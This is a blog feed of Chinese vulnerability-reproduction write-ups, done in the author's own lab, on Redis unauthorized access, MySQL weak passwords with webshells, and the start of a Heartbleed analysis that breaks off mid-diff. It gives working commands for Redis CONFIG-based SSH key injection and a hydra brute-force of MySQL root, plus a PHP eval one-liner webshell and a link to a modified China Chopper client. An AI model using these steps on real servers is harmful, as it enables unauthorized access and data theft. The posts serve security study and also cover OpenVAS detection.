id="具体漏洞描述"><a href="#具体漏洞描述" class="headerlink" title="具体漏洞描述"></a>具体漏洞描述</h3><p>Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。<br>Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。<br>因为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致<br>Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。<br>利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>如果攻击者进入了我们的redis服务器，他便可以自由下载数据库中的文件，造成信息泄露，造成个人隐私泄露或者公司机密泄露，造成巨大损害。同时如果攻击者进行提权获取更大的权限，还会产生更大的危害。<br>我尝试使用Shodan对公网上的开放的redis进行搜索（port:6379）：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7fc09c6976b6b496.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>我们可以看到一共有87881个结果，其中我国位列榜首。。。。国人的安全意识还是有待提高。<br>看一下具体地图分布吧：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8b7e33954b786784.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>两次搜索数量有一点不一样。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4f7cad8bdf84c769.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>榜首竟然是杭州阿里巴巴。</p><h2 id="漏洞的复现和利用"><a href="#漏洞的复现和利用" class="headerlink" title="漏洞的复现和利用"></a>漏洞的复现和利用</h2><h3 id="安装redis（我采用源码安装）"><a href="#安装redis（我采用源码安装）" class="headerlink" title="安装redis（我采用源码安装）"></a>安装redis（我采用源码安装）</h3><h4 id="首先下载源码然后编译安装"><a href="#首先下载源码然后编译安装" class="headerlink" title="首先下载源码然后编译安装"></a>首先下载源码然后编译安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-4.0.6.tar.gz</span><br><span class="line">$ tar xzf redis-4.0.6.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> redis-4.0.6</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>编译完成：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-2d19a664cbbf55d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf（这个在安装目录）。然后拷贝到一个目录下。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir /usr/redis</span><br><span class="line">$ cp redis-server  /usr/redis</span><br><span class="line">$ cp redis-benchmark /usr/redis</span><br><span class="line">$ cp redis-cli  /usr/redis</span><br><span class="line">$ cp redis.conf  /usr/redis</span><br><span class="line">$ <span class="built_in">cd</span> /usr/redis</span><br></pre></td></tr></table></figure></p><h4 id="开启redis服务"><a href="#开启redis服务" class="headerlink" title="开启redis服务"></a>开启redis服务</h4><p>直接进入刚刚创建的redis文件夹后执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./redis-server ./redis.conf</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-91c08afaf7ce1fe8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p><h4 id="检查是否成功开启"><a href="#检查是否成功开启" class="headerlink" title="检查是否成功开启"></a>检查是否成功开启</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-dcf471aeeacd9fbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p><h4 id="配置redis，使他处于漏洞状态"><a href="#配置redis，使他处于漏洞状态" class="headerlink" title="配置redis，使他处于漏洞状态"></a>配置redis，使他处于漏洞状态</h4><p>我直接开启了redis，此时没有认证，redis的默认就是这样，然后我只需要将redis更改绑定在0.0.0.0:6379就可以，在redis.conf里面更改就行了。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d5816eceeec8f77a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p><h4 id="尝试使用namp扫描了一下我的6379端口"><a href="#尝试使用namp扫描了一下我的6379端口" class="headerlink" title="尝试使用namp扫描了一下我的6379端口"></a>尝试使用namp扫描了一下我的6379端口</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-edefc35b34a306a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>可以看到一下子就可扫描出信息，而且包含一下敏感信息。</p><h4 id="尝试利用redis客户端进行未授权访问"><a href="#尝试利用redis客户端进行未授权访问" class="headerlink" title="尝试利用redis客户端进行未授权访问"></a>尝试利用redis客户端进行未授权访问</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-96f441ad5cf753d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>果然，很成功就进入了，上门查看了主机信息（信息在下面，没截图）</p><h4 id="开启公钥登录"><a href="#开启公钥登录" class="headerlink" title="开启公钥登录"></a>开启公钥登录</h4><p>生成公钥：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa //rsa加密</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-fb1eccee2bbc48d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>然后将公钥写入文本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh/</span><br><span class="line">$ (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt; 1.txt</span><br></pre></td></tr></table></figure></p><p>将1.txt写入redis<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat 1.txt | /usr/redis/./redis-cli -h 127.0.0.1  -x <span class="built_in">set</span> crack</span><br></pre></td></tr></table></figure></p><p>利用redis客户端连接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./redis-cli -h 127.0.0.1</span><br></pre></td></tr></table></figure></p><p>获取redis备份路径，更改redis备份路径，设置备份文件的名称为authorized_key<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ CONFIG GET dir</span><br><span class="line">$ CONFIG SET dir /home/r_song/.ssh     //更改目录到r_song下</span><br><span class="line">$ CONFIG SET dbfilename authorized_keys  </span><br><span class="line">$ CONFIG GET dbfilename     //获取确认一下更改成功</span><br><span class="line">$ Save        //保存</span><br></pre></td></tr></table></figure></p><p>然后用ssh进行连接即可(在.ssh路径执行，并先把我们虚拟机的ssh服务打开)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh –i  id_rsa ******@127.0.0.1</span><br></pre></td></tr></table></figure></p><p>就可以成功登录。</p><h2 id="使用openvas对我们存在漏洞的系统进行扫描"><a href="#使用openvas对我们存在漏洞的系统进行扫描" class="headerlink" title="使用openvas对我们存在漏洞的系统进行扫描"></a>使用openvas对我们存在漏洞的系统进行扫描</h2><h3 id="查扫描结果（在上一篇博客介绍了openvas）"><a href="#查扫描结果（在上一篇博客介绍了openvas）" class="headerlink" title="查扫描结果（在上一篇博客介绍了openvas）"></a>查扫描结果（在上一篇博客介绍了openvas）</h3><p><img src="http://upload-images.jianshu.io/upload_images/6269327-47cd19d87e363524.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>从图中我们可以看到，redis-1我是使用默认的扫描方式，然后redis2是扫描的all tcp and namp 5.1 top100扫描的但是结果不一样。我们重点看redis2这个扫描结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-723ad76a9628d6ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>可以看到扫描出了redis服务没有密码。</p><h3 id="了解openvas使用的各种插件，即nvt是什么"><a href="#了解openvas使用的各种插件，即nvt是什么" class="headerlink" title="了解openvas使用的各种插件，即nvt是什么"></a>了解openvas使用的各种插件，即nvt是什么</h3><p>Nvt（network vulnerability tests）即网络漏洞测试，是openvas中的免费的扫描插件。我可以在线同步获取这个插件（openvas-nvt-sync）或者离线下载。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-f12bb14d87c765fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>这是我在官网上找到的openvas工作的图，可以看到，openvas的插件nvt是在openvas scanner提供服务的。nvt就是根据不同的需求调用nasl脚本进行检测。</p><h3 id="对应扫描该漏洞的nvt是什么？"><a href="#对应扫描该漏洞的nvt是什么？" class="headerlink" title="对应扫描该漏洞的nvt是什么？"></a>对应扫描该漏洞的nvt是什么？</h3><p>在扫描结果中可以找到nvt的名称，以及OID编号，在 <a href="http://www.openvas.org/openvas-nvt-feed.html" target="_blank" rel="noopener">http://www.openvas.org/openvas-nvt-feed.html</a> 中可以根据OID编号查找对应nvt的文件名是什么，然后可以在/var/lib/openvas/plugins/目录下，找到该文件。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4fc9aecc239752a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>找到指定文件：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-a12fd1dd28524475.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-1c76f50da5c85178.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br>前面是这个nvt的一些信息，比如oid，version，还有危险评分等。Family是属于database的。基本这些都是信息。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-911af7277c87e599.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>主要就是后面几行，先获取了端口信息，确定端口是否打开：get_app_port()。然后使用get_kb_item(〈name〉)函数可以获得基本信息的〈name〉项的值，这个函数是匿名函数。通过测试no_password如果成功了就说明有这个漏洞，然后退出。后面是加密信息端口号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;redis未授权访问漏洞&quot;&gt;&lt;a href=&quot;#redis未授权访问漏洞&quot; class=&quot;headerlink&quot; title=&quot;redis未授权访问漏洞&quot;&gt;&lt;/a&gt;redis未授权访问漏洞&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;了解漏洞&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="redis未授权访问" scheme="http://rliyuqing.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>MySQL弱密码和webshell（附可用于php7的菜刀）</title>
    <link href="http://rliyuqing.github.io/2019/04/15/3.%20MySQL%E5%BC%B1%E5%AF%86%E7%A0%81%E5%92%8Cwebshell%EF%BC%88%E9%99%84%E5%8F%AF%E7%94%A8%E4%BA%8Ephp7%E7%9A%84%E8%8F%9C%E5%88%80%EF%BC%89/"/>
    <id>http://rliyuqing.github.io/2019/04/15/3. MySQL弱密码和webshell（附可用于php7的菜刀）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:48:19.561Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="MySQL弱密码和webshell"><a href="#MySQL弱密码和webshell" class="headerlink" title="MySQL弱密码和webshell"></a>MySQL弱密码和webshell</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="Mysql是什么？"><a href="#Mysql是什么？" class="headerlink" title="Mysql是什么？"></a>Mysql是什么？</h3><p>Mysql是一种典型的小型的关系型数据库，通常用于网站后台数据库。一般为lamp或者wamp构成一般web服务器。他一般默认端口是3306。</p><h3 id="Mysql弱密码漏洞是什么"><a href="#Mysql弱密码漏洞是什么" class="headerlink" title="Mysql弱密码漏洞是什么"></a>Mysql弱密码漏洞是什么</h3><p>Mysql弱密码漏洞，就是说mysql的root用户的没有密码，或者密码太简单，太短，容易被猜测或者被爆破。可以被攻击者用来恶意登录，窃取数据库信息，而且一般mysql作为网站后台数据库，所以可能导致被攻击者获取网站权限，getshell。</p><h2 id="分析漏洞产生原理"><a href="#分析漏洞产生原理" class="headerlink" title="分析漏洞产生原理"></a>分析漏洞产生原理</h2><h3 id="具体漏洞产生的原理是什么"><a href="#具体漏洞产生的原理是什么" class="headerlink" title="具体漏洞产生的原理是什么"></a>具体漏洞产生的原理是什么</h3><p>Mysql的弱口令漏洞主要是因为管理员没有安全意识，使用了mysql的默认密码，之前的版本默认密码是空的很多人没有更改，但是mysql5.7之后就不允许密码为空了，安装的时候就会让你输入密码了。然后一些人改了密码，但是密码太弱了，短的纯数字的等等，很容易被爆破。</p><h3 id="Mysql结合webshell有什么危害"><a href="#Mysql结合webshell有什么危害" class="headerlink" title="Mysql结合webshell有什么危害"></a>Mysql结合webshell有什么危害</h3><p>通过web注入获取webshell我有过一定的经历，所以也知道这其中的危害。注入也是获取数据库信息，如果攻击者获取了mysql的权限，获取了数据，便可得到数据库数据，同时网站的许多敏感信息都是存放的数据库中的，比如用户名密码，管理员账号密码。然而加密往往都是MD5，基本上简单的md5都可以通过网上的彩虹表匹配找到对应的密码。然后攻击者便可利用账号密码登录web后台，利用上传木马等手段，更可获取网站服务器的权限，甚至之后的内网等等。所以说mysql结合webshell的危害是很可怕的。</p><h2 id="漏洞重现和利用"><a href="#漏洞重现和利用" class="headerlink" title="漏洞重现和利用"></a>漏洞重现和利用</h2><h3 id="安装lamp（linux-apache-mysql-php）环境"><a href="#安装lamp（linux-apache-mysql-php）环境" class="headerlink" title="安装lamp（linux+apache+mysql+php）环境"></a>安装lamp（linux+apache+mysql+php）环境</h3><p>本来想直接用我装好的wamp的，不过由于lamp使用更加广泛，所以这次搭建一个lamp的环境进行测试。</p><h4 id="安装apache"><a href="#安装apache" class="headerlink" title="安装apache"></a>安装apache</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf install httpd –y</span><br><span class="line">$ systemctl <span class="built_in">enable</span> httpd</span><br><span class="line">$ systemctl start httpd</span><br></pre></td></tr></table></figure><p>安装好之后，开启了服务就在浏览器上输入127.0.0.1:8080(我设置成了8080，没有更改的话就是80)访问看看有没有成功开启apacge服务，如下图：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-6ed8a18b88e834b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p><h4 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf install [https://dev.mysql.com/get/mysql57-community-release-fc26-10.noarch.rpm](https://dev.mysql.com/get/mysql57-community-release-fc26-10.noarch.rpm)</span><br><span class="line">$ dnf install mysql-community-server</span><br><span class="line">$ systemctl start mysqld.service    //启动mysql服务器并同时自动启动mysql</span><br><span class="line">$ systemctl <span class="built_in">enable</span> mysqld.service</span><br><span class="line">$ grep <span class="string">'A temporary password is generated for root@localhost'</span> /var/<span class="built_in">log</span>/mysqld.log |tail -1 //获取随机生成的root密码</span><br></pre></td></tr></table></figure><p>然后设置mysql的安全配置：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/mysql_secure_installatio</span><br></pre></td></tr></table></figure></p><p>主要是进行更改root密码，是否删除匿名用户，是否允许远程root登录，是否删除测试数据库并访问它，是否重新加载特权表等进行配置。最重要的就是更改系统自动生成的密码。</p><h4 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf install php –y</span><br><span class="line">$ vi /var/www/html/test.php     //检查php是否成功安装</span><br><span class="line">$ &lt;? phpphpinfo(); ?&gt;   //文本写入</span><br><span class="line">$ systemctl restart httpd     //重启apache</span><br></pre></td></tr></table></figure><p>然后访问127.0.0.1:8080/test.php<br><img src="http://upload-images.jianshu.io/upload_images/6269327-2b9ad792af7a9481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>可以看到php环境配置成功了，然后需要安装php模块，主要是用于连接php和mysql 的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf search php</span><br><span class="line">$ dnf install php-mysql –y</span><br><span class="line">$ systemctl restart httpd</span><br></pre></td></tr></table></figure></p><p>安装好之后重启了apache之后再次看页面：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-5259d5fe5fe8c3cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>模块安装成功。</p><h4 id="安装hydra"><a href="#安装hydra" class="headerlink" title="安装hydra"></a>安装hydra</h4><p>这个网上很多教程，我这里贴一下命令就是了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-d86b7ab15504945b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p><h2 id="利用hydra进行mysql弱密码攻击"><a href="#利用hydra进行mysql弱密码攻击" class="headerlink" title="利用hydra进行mysql弱密码攻击"></a>利用hydra进行mysql弱密码攻击</h2><p>我先利用自己之前收集的弱密码，选了top2000，然后生成密码字典，用于爆破。因为我的mysql密码并不是弱密码，所以为了实现成功爆破我把我的密码也加入了密码字典：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-2dabd057efc8377e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>开始之前先用nmap扫描一下主机，确定端口开放情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-31974a8f967fca23.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6_LI (2).jpg"><br>可以看到nmap扫描到了端口3306开放，服务就是mysql。接下来便可以利用hydra对3306端口进行爆破：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-cab41ca0703095ef.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7_LI.jpg"><br>Bingo！成功爆破出了密码，但是这个过程出现了很多的问题，首先就是命令不对，导致一直出现爆破不出来的问题，然后我以为只是mysql最大连接数的问题，于是把最大连接数改成了2000，然后重新来，还是有问题：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d48513947e395dc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>这个是一开始我使用的命令，后面换了下面的命令就成功了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ Hydra –l root –P password.txt 127.0.0.1 mysql</span><br></pre></td></tr></table></figure></p><p>当然这里也可以同时使用用户名字典和密码字典，但是因为mysql基本都是root，所以我就直接用root，但是用户字典也很重要。<br>扫出了密码下面便可进行写入webshell了。<br>为了保证实验正确性，我使用另一台主机进行写入webshell进行远程连接。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1dc606443272c6a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>但是发现我发远程连接，去服务器上看发现果然，root只支持在本地访问：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1cf73128db561bee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>我们更改一下，把localhost更改为%，这样就可以支持任意地址访问了。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c9fe27076dd2b46a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>这样就ok啦！<img src="http://upload-images.jianshu.io/upload_images/6269327-c1220f2de056717d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>然后进行写入php一句话，但是导出时发现文件被限制了输出位置，然后我在my.cnf中加入secure-file-priv = ‘’：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-970f8babb2a990df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>但是发现还是权限不够，发现是输出目录权限问题，使用chomd 777 www 命令授予权限，最后成功执行。下图因为当时已经输出了没有截图，我就又执行了一遍。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d58287ffe90be34a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>然后写入一句话，接下来就可以用菜刀啦！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-da316a2649c5adef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-949139e7e01590b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>成功连接！</p><h2 id="如果公司的mysql存在弱密码会有怎样的风险？"><a href="#如果公司的mysql存在弱密码会有怎样的风险？" class="headerlink" title="如果公司的mysql存在弱密码会有怎样的风险？"></a>如果公司的mysql存在弱密码会有怎样的风险？</h2><p>如果某个公司的web服务器存在弱密码，很有可能被攻击者利用，破解，爆破出了数据库用户密码，这会致使公司网站信息，内部信息被窃取，许多敏感信息暴露，甚至可能被攻击者勒索。其次，如果攻击者获取数据权限后还获取了webshell，进行提权等操作之后，便可获得公司服务器的权限，造成更严重的信息泄露。</p><h2 id="使用openvas对该漏洞进行扫描"><a href="#使用openvas对该漏洞进行扫描" class="headerlink" title="使用openvas对该漏洞进行扫描"></a>使用openvas对该漏洞进行扫描</h2><p>因为怕扫不出来所以我不mysql的密码改成了123456.<br><img src="http://upload-images.jianshu.io/upload_images/6269327-5f29ae6a2fda62da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-dd3e04ff12f8aabd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>可以看到成功的扫描出了mysql weak password。Mysql的弱密码，点进去可以看到，mysql中root用户的密码已经被爆出来了，为123456；同时可以看到这是一个高危漏洞，评分为9.0分。</p><h2 id="一些问题的解决"><a href="#一些问题的解决" class="headerlink" title="一些问题的解决"></a>一些问题的解决</h2><p>在利用webshell时确保主机能访问靶机的apache服务。这样才能保证菜刀可以连接成功。还有就是在高版本的php新增了安全策略会自动过滤非法提交的post或get参数，所以这样导致了很多同学用菜刀连接失败，响应确实200.因为一句话执行了，但是get参数没有成功转换为变量。写入webshell时最主要的就是权限问题了。Mysql5.7中写入导出指定了文件夹，使我们不能成功将一句话写入到指定的的文件夹。我在my.cnf加入上面提到的代码，使可以导出到任意有权限的目录。</p><p>因为当php7时因为菜刀无法连接的问题，所以使用手动的方法连接。所以我将传递的一句话&lt;? php eval($_POST[cmd]); ?&gt; 里面的POST传递模式改为了GET这样方便演示，因为post的话还需要抓包更改，但也是可以的。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-84ebef8e2b056acd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"><br>可以看到，将语句赋值给cmd之后便可传过去执行。其实就是菜刀把我们传过去的cmd设置成为全局变量，然后我们传参之后就可以进行语句执行，菜刀就是集成这些语句。<br>因为get传参有长度限制，所以我使用postman来进行post的传参查询<br><img src="http://upload-images.jianshu.io/upload_images/6269327-370861b341e7597f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"><br>网上找了查询php查询文件的代码，成功查询到了目录下的文件，然后输入不同函数就可以执行了。比如下载等，菜刀其实就是集成了这些代码的工具，我们通过自己手动测试也可以达到一样的效果。所以猜测php7中的一句话无法用菜刀连接的可能是因为php7中对菜刀中集成的代码中的某个重要函数进行了过滤，所以菜刀不能连接，我们自己写的却可以。<br>还有其他方法，比如直接写入了webshell大马，直接连接。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-5ac632e9d18ef2b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="21.png"><br>但是就是大马写入的时候比较麻烦，代码较长。写入数据库时比较麻烦，而且不容易伪装，很容易被发现。</p><h2 id="解决php7无法使用菜刀连接一句话问题"><a href="#解决php7无法使用菜刀连接一句话问题" class="headerlink" title="解决php7无法使用菜刀连接一句话问题"></a>解决php7无法使用菜刀连接一句话问题</h2><p>因为php7对菜刀的过滤，所以博主分析一个更改后可以在php7环境下连接一句话的java版菜刀，mac和win都可以用<br>百度网盘：<a href="https://pan.baidu.com/s/1d28kqi" target="_blank" rel="noopener">https://pan.baidu.com/s/1d28kqi</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;MySQL弱密码和webshell&quot;&gt;&lt;a href=&quot;#MySQL弱密码和webshell&quot; class=&quot;headerlink&quot; title=&quot;MySQL弱密码和webshell&quot;&gt;&lt;/a&gt;MySQL弱密码和webshell&lt;/h1&gt;&lt;hr&gt;
&lt;h2
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="mysql弱密码" scheme="http://rliyuqing.github.io/tags/mysql%E5%BC%B1%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>heartbleed漏洞及内存信息窃取</title>
    <link href="http://rliyuqing.github.io/2019/04/15/5.%20heartbleed%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%86%85%E5%AD%98%E4%BF%A1%E6%81%AF%E7%AA%83%E5%8F%96/"/>
    <id>http://rliyuqing.github.io/2019/04/15/5. heartbleed漏洞及内存信息窃取/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:48:34.772Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="heartbleed漏洞及内存信息窃取"><a href="#heartbleed漏洞及内存信息窃取" class="headerlink" title="heartbleed漏洞及内存信息窃取"></a>heartbleed漏洞及内存信息窃取</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="Heartbleed漏洞是什么？"><a href="#Heartbleed漏洞是什么？" class="headerlink" title="Heartbleed漏洞是什么？"></a>Heartbleed漏洞是什么？</h3><p>Heartbleed漏洞是openssl加密软件库中的一个严重的漏洞。这个漏洞允许在正常情况下通过用于保护因特网的ssl/tls加密来窃取受保护的信息。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。<br>此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多。<br>这个漏洞在通用漏洞披露（CVE）系统中的编号为CVE-2014-0160。</p><h3 id="它的背景和影响是什么？"><a href="#它的背景和影响是什么？" class="headerlink" title="它的背景和影响是什么？"></a>它的背景和影响是什么？</h3><p>背景：<br>OpenSSL于2014年4月7日被公开披露据。信在漏洞披露时，约有17%（大约五十万）通过认证机构认证的互联网安全网络服务器容易受到攻击，导致服务器私钥和用户会话cookie及密码被盗。电子前哨基金会、Ars Technica和布鲁斯·施奈尔均认为心脏出血漏洞是“灾难性的”。福布斯网络安全专栏作家约瑟夫·斯坦伯格写道：“有些人认为，至少就其潜在影响而言，‘心脏出血’是自互联网允许商用以来所发现的最严重的漏洞。”<br>影响：<br>经由heartbleed漏洞发动攻击，获得的数据可能包括TLS双方将要交换、但尚未加密的机密内容，包括在用户请求中各种格式的post数据。此外，泄漏的数据还可能含有身份验证密令，如会话cookie及密码，可使攻击者向该服务冒充此用户。<br>攻击还可能泄漏受攻击双方的私钥，这将使攻击者能解密通信内容（将来或是之前通过被动窃听捕获而存储的通信，除非使用完全正向保密，而在这种情况下，只能解密将来通过中间人攻击截获的通信）。<br>即使漏洞修复之后，获得受害者认证资料的攻击者仍能伪装成资料的拥有者，只要该资料能被接受（例如，在更改密码或撤销私钥之前）。因此，漏洞对保密性构成了致命威胁。然而，冒充受害人的攻击者也能修改数据，所以间接的后果可能不只是系统机密泄漏那么简单。<br>一项于2014年4月对美国成人进行的调查显示，60%的人听说过心脏出血漏洞。使用互联网的受访者中有39%的人采取了行动以保护他们的在线账户，如更改密码或注销账户；29%的人认为他们的个人信息因漏洞而处于危险之中；6%的人认为他们的个人信息已遭窃取。</p><h2 id="分析漏洞原理"><a href="#分析漏洞原理" class="headerlink" title="分析漏洞原理"></a>分析漏洞原理</h2><h3 id="源码中那些地方出现了问题？"><a href="#源码中那些地方出现了问题？" class="headerlink" title="源码中那些地方出现了问题？"></a>源码中那些地方出现了问题？</h3><p>我们直接看一下修复后的提交的代码和之前代码的区别：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--- a/ssl/d1_both.c</span><br><span class="line">+++ b/ssl/d1_both.c</span><br><span class="line">@@ -1459,26 +1459,36 @@ dtls1_process_heartbeat(SSL 